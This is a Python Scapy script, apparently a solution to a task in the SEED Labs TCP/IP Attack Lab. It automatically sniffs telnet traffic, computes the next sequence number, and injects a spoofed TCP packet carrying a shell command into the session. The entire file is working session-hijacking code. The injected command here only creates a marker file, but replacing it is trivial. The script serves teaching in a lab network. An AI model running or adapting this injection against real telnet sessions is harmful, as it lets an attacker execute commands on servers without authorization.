#!/usr/bin/env python3
"""
Task 3: TCP Session Hijacking (Automatic)
SEED Labs - TCP/IP Attack Lab

This script automatically sniffs telnet traffic to extract TCP session
parameters and then injects a malicious command into the session.

Usage:
    sudo python3 session_hijack_auto.py
"""

from scapy.all import *
import sys

IFACE   = "br-983f4e838608"   # Docker bridge interface for container network
FILTER  = "tcp and dst port 23"  # capture packets going TO the telnet server

# Malicious shell command to execute on the server
MALICIOUS_CMD = "\r touch /tmp/hijacked \r"

injected = False  # send the payload only once


def hijack(pkt):
    """Sniff a telnet packet and inject a malicious command."""
    global injected
    if injected:
        return
    
    try:
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return

        # Only process packets that have payload data
        if not pkt.haslayer(Raw):
            return

        ip_layer  = pkt[IP]
        tcp_layer = pkt[TCP]

        # Advance seq past the sniffed payload so the server treats the
        # injected data as new bytes, not a retransmission or overlap.
        payload_len = len(tcp_layer[Raw].load)
        next_seq = tcp_layer.seq + payload_len

        # Build a spoofed ACK packet with the injected payload
        ip  = IP(src=ip_layer.src, dst=ip_layer.dst)
        tcp = TCP(
            sport=tcp_layer.sport,
            dport=tcp_layer.dport,
            flags="A",
            seq=next_seq,
            ack=tcp_layer.ack,
        )
        spoof_pkt = ip / tcp / MALICIOUS_CMD
        send(spoof_pkt, verbose=0)
        injected = True
        print(f"[+] Injected command into session "
              f"{ip_layer.src}:{tcp_layer.sport} -> "
              f"{ip_layer.dst}:{tcp_layer.dport}")
        print(f"[+] Command: {MALICIOUS_CMD.strip()}")
    except Exception as e:
        print(f"[-] Error injecting command: {e}", file=sys.stderr)


if __name__ == "__main__":
    print(f"[*] Starting TCP Session Hijacking attack on interface {IFACE}")
    print(f"[*] Filter: {FILTER}")
    print(f"[*] Command to inject: {MALICIOUS_CMD.strip()}")
    print("[*] Waiting for telnet traffic...")
    try:
        sniff(iface=IFACE, filter=FILTER, prn=hijack, store=False)
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        sys.exit(1)
